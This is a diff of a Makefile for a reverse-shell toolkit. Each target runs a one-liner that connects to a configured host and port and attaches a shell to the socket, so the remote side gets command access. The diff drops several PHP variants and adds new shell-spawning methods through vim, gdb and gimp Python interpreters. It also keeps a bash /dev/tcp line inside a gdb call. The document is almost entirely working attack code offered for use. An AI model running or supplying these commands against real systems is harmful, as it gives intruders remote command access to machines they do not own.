@@ -4,7 +4,7 @@ RSHELL	:= /bin/bash
 PORT2	:= 4445
 TMP		:= /tmp/f
 
-METHODS	:= listener ncat1 ncat2 telnet1 telnet2 socat socket openssl openssl-listener curl curl-listener bash ksh zsh tclsh pwsh python3 pip perl cpan php1 php2 php3 php4 php5 php6 lua ruby1 ruby2 irb1 irb2 node jrunscript jjs julia gcc javac go gawk gdb encoded-ncat
+METHODS	:= listener ncat1 ncat2 telnet1 telnet2 socat socket openssl openssl-listener curl curl-listener bash ksh zsh tclsh pwsh python3 pip perl cpan phps lua ruby1 ruby2 irb1 irb2 node jjs julia gcc javac go gawk gdb vim-python gdb-python gimp-python encoded-ncat
 
 BOLD		:= \033[1m
 UNDERLINE	:= \033[4m
@@ -19,17 +19,18 @@ normal=$(tput sgr0)
 .PHONY: show
 
 show:
-	@printf "SHELL: $(GREEN)$(RSHELL)$(RESET)\n"
-	@printf "HOST: $(GREEN)$(HOST)$(RESET)\n"
-	@printf "PORT: $(GREEN)$(PORT)$(RESET)\n"
-	@printf "SECOND PORT*: $(GREEN)$(PORT2)$(RESET)\n"
-	@printf "TEMPORARY FILE/DIR*: $(GREEN)$(TMP)$(RESET)\n"
-	@printf "* = only necessary for some methods\n"
+	@printf "HOST  : $(GREEN)$(HOST)$(RESET)\n"
+	@printf "PORT  : $(GREEN)$(PORT)$(RESET)\n"
+	@printf "SHELL : $(GREEN)$(RSHELL)$(RESET)\n"
+	@printf "PORT2 : $(GREEN)$(PORT2)$(RESET)\n"
+	@printf "TMP   : $(GREEN)$(TMP)$(RESET)\n"
 	@printf "\n"
-	@printf "To change previous values, run $(UNDERLINE)./configure <host> <port> <shell> <port2> <tmp>$(RESET).\n"
+	@printf "To change previous values, run $(UNDERLINE)./configure <key>=<value> [<key>=<value> ...]$(RESET).\n"
 	@printf "\n"
 	@printf "Available methods:\n"
-	@$(foreach cmd, $(METHODS), printf "   $(BOLD)$(BLUE)$(cmd)$(RESET)\n";)
+	@CODES=$$(echo "$(METHODS)" | tr ' ' '\n' | sort); \
+		PADDED=$$(printf "%s\n" "$$CODES" | awk '{printf "%-20s\n", $$1}'); \
+		printf "%s\n" "$$PADDED" | awk '{printf "\033[1m\033[34m%s\033[0m\n", $$0}' | column
 	@printf "\n"
 	@printf "Run $(UNDERLINE)make <method>$(RESET) to use a specific method from the list.\n"
 	@printf "Run $(UNDERLINE)make <method>-show$(RESET) to just see the command(s) for a specific method (without running it).\n"
@@ -223,41 +224,11 @@ cpan-show:
 
 ############################ PHP ###########################
 
-php1:
+php:
 	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); proc_open("$(RSHELL)", array(0=>$$sock, 1=>$$sock, 2=>$$sock),$$pipes);'
 
-php1-show:
+php-show:
 	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); proc_open(\"$(RSHELL)\", array(0=>\$$sock,1=>\$$sock,2=>\$$sock), \$$pipes);'\n"
-
-php2:
-	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); exec("$(RSHELL) <&3 >&3 2>&3");'
-
-php2-show:
-	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); exec(\"$(RSHELL) <&3 >&3 2>&3\");'\n"
-
-php3:
-	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); system("$(RSHELL) <&3 >&3 2>&3");'
-
-php3-show:
-	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); system(\"$(RSHELL) <&3 >&3 2>&3\");'\n"
-
-php4:
-	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); shell_exec("$(RSHELL) <&3 >&3 2>&3");'
-
-php4-show:
-	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); shell_exec(\"$(RSHELL) <&3 >&3 2>&3\");'\n"
-
-php5:
-	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); passthru("$(RSHELL) <&3 >&3 2>&3");'
-
-php5-show:
-	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); passthru(\"$(RSHELL) <&3 >&3 2>&3\");'\n"
-
-php6:
-	php -r '$$sock = fsockopen("$(HOST)",$(PORT)); popen("$(RSHELL) <&3 >&3 2>&3", "r");'
-
-php6-show:
-	@printf "php -r '\$$sock = fsockopen(\"$(HOST)\",$(PORT)); popen(\"$(RSHELL) <&3 >&3 2>&3\", \"r\");'\n"
 
 ############################################################
 
@@ -390,6 +361,36 @@ gdb-show:
 		exit 1; \
 	fi
 	@printf "gdb --batch -p $(PID) -ex 'call (int) system(\"bash -c '\''$(RSHELL) &> /dev/tcp/$(HOST)/$(PORT) 0>&1'\''\")'\n"
+
+############################################################
+
+######################## VIM PYTHON ########################
+
+vim-python:
+	vim -c ':pyx import socket,os; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp("$(RSHELL)", ["$(RSHELL)"]); vim.command(":q!")'
+
+vim-python-show:
+	@printf "vim -c ':pyx import socket,os; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(RSHELL)\", [\"$(RSHELL)\"]); vim.command(\":q!\")'\n"
+
+############################################################
+
+######################## GDB PYTHON ########################
+
+gdb-python:
+	gdb --batch -ex 'python import os,socket; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp("$(RSHELL)", ["$(RSHELL)"])'
+
+gdb-python-show:
+	@printf "gdb --batch -ex 'python import os,socket; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(RSHELL)\", [\"$(RSHELL)\"])'\n"
+
+############################################################
+
+######################## GIMP PYTHON #######################
+
+gimp-python:
+	gimp -i --batch-interpreter=python-fu-eval -b 'import socket,os; sock = socket.socket(); sock.connect(("$(HOST)",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp("$(RSHELL)", ["$(RSHELL)"])'
+
+gimp-python-show:
+	@printf "gimp -idf --batch-interpreter=python-fu-eval -b 'import socket,os; sock = socket.socket(); sock.connect((\"$(HOST)\",$(PORT))); [os.dup2(sock.fileno(),fd) for fd in (0,1,2)]; os.execvp(\"$(RSHELL)\", [\"$(RSHELL)\"])'\n"
 
 ############################################################
 
